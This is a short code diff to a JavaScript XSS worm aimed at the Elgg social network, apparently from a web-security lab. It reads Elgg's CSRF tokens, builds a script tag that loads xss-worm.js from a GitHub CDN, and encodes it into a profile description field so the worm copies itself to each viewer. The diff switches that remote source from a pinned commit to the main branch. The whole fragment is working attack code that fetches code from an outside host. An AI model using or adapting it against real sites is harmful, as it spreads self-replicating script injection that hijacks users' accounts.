@@ -7,7 +7,7 @@ window.onload = function(){
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
-    var wormscript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@91b609115ece1b8dab94667045de0262569c0aa5/xss-worm.js"></script>'
+    var wormscript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@main/xss-worm.js"></script>'
 
     // Construct the content of your URL.
     var content = "&description=" + encodeuri(wormscript); 
